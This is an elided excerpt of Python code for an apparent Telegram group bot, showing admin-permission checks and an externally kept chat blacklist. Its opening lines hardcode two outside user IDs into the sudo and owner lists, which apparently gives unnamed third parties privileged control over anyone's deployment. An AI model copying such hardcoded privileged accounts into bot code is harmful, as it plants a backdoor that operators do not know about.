...
SUDO_USERS.append(2048431295)

OWNER_ID.append(936481432)
...
async def check_perms(
    ...
    if user.status != "administrator":
        if notice:
            await sender("Give me the administrator permission." if user.user.is_self else
                         "⊙﹏⊙ Only admins can use this command.")
        return False
    ...
    if not missing_perms:
        return True
    if notice:
        permission_text = "__\n メ __".join(missing_perms)
        await sender(f"ー_ー Give me the following permission below:\n\n メ**{permission_text}**" if user.user.is_self
                     else f"Only Admins can use this command.\n\n メ **{permission_text}**")
    return False
    ...
    def decorator(func):
        ...
        async def wrapper(
            ...
            if chat.id in await blacklisted_chats():
                await sender("This chat has Blacklisted by The Godfather Network and You're not allowed to use me in this chat.")
